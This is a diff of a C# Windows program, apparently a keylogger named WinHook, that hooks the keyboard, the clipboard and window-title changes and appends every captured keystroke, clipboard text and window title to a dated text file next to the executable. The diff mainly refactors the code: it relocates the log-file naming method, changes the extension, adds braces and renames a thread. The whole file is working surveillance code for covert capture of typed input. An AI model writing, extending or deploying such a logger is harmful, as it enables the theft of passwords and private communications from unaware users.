@@ -1,39 +1,40 @@
-using System;
+﻿using System;
 using System.IO;
 using System.Media;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using static WinHook.Kernel32;
 
 namespace WinHook
 {
     public class WinHookContext : ApplicationContext
     {
-        private readonly ClipboardHook clipHook = new ClipboardHook();
-        private readonly DuplicateLaunch dlaunch = DuplicateLaunch.Default;
-        private readonly NamedEvent exitEvent = NamedEvent.Deafult;
-        private readonly KeyboardHook kbdHook = new KeyboardHook();
-        private readonly StreamWriter streamWriter;
-        private readonly WindowsHook wndHook = new WindowsHook();
+        private KeyboardHook kbdHook = new KeyboardHook();
+        private WindowsHook wndHook = new WindowsHook();
+        private ClipboardHook clipHook = new ClipboardHook();
+        private StreamWriter streamWriter;
+        private NamedEvent exitEvent = NamedEvent.Deafult;
+        private DuplicateLaunch dlaunch = DuplicateLaunch.Default;
+
+        private static string GetArchiveFileName()
+        {
+            StringBuilder buffer = new StringBuilder(255);
+            GetModuleFileName(IntPtr.Zero, buffer, 255);
+            string filePath = buffer.ToString();
+            string dirName = Path.GetDirectoryName(filePath);
+            return Path.Combine(dirName, Path.ChangeExtension(DateTime.Today.ToString("yyyy_MM_dd"), ".txt"));
+        }
 
         public WinHookContext()
         {
-            var thread = new Thread(ExitAppEventHandler);
+            Thread exitAppWatchDog = new Thread(ExitAppEventHandler);
             streamWriter = new StreamWriter(GetArchiveFileName(), true);
             wndHook.WindowTextChanged += WndHookOnWindowTextChanged;
             kbdHook.KeyUp += KbdHookOnKeyUp;
             clipHook.ClipBoardChanged += ClipHookOnClipBoardChanged;
-            thread.Start();
+            exitAppWatchDog.Start();
             SystemSounds.Exclamation.Play();
-        }
-
-        private static string GetArchiveFileName()
-        {
-            var buffer = new StringBuilder(255);
-            Kernel32.GetModuleFileName(IntPtr.Zero, buffer, 255);
-            buffer.ToString();
-            return Path.Combine(Environment.CurrentDirectory,
-                Path.ChangeExtension(DateTime.Today.ToString("yyyy_MM_dd"), ".log"));
         }
 
         private void ExitAppEventHandler()
@@ -47,16 +48,19 @@ namespace WinHook
         private void KbdHookOnKeyUp(object sender, LowLevelKeyboardEventArgs eventargs)
         {
             if (sender is KeyboardHook && eventargs.Text.Length > 0)
+            {
                 lock (streamWriter)
                 {
                     streamWriter.Write(eventargs.Text);
                     streamWriter.Flush();
                 }
+            }
         }
 
         private void ClipHookOnClipBoardChanged(ClipboardChangedEventArgs eventargs)
         {
             if (eventargs.Text.Length > 0)
+            {
                 lock (streamWriter)
                 {
                     streamWriter.WriteLine();
@@ -64,17 +68,21 @@ namespace WinHook
                     streamWriter.WriteLine(eventargs.Text);
                     streamWriter.Flush();
                 }
+            }
         }
 
         private void WndHookOnWindowTextChanged(object sender, WindowTextChangeArgs eventargs)
         {
             if (sender is WindowsHook && eventargs.Text.Length > 0)
+            {
                 lock (streamWriter)
                 {
                     streamWriter.WriteLine();
                     streamWriter.WriteLine($"{eventargs.TimeStamp} {eventargs.Text}");
                     streamWriter.Flush();
                 }
+
+            }
         }
 
         protected override void Dispose(bool disposing)
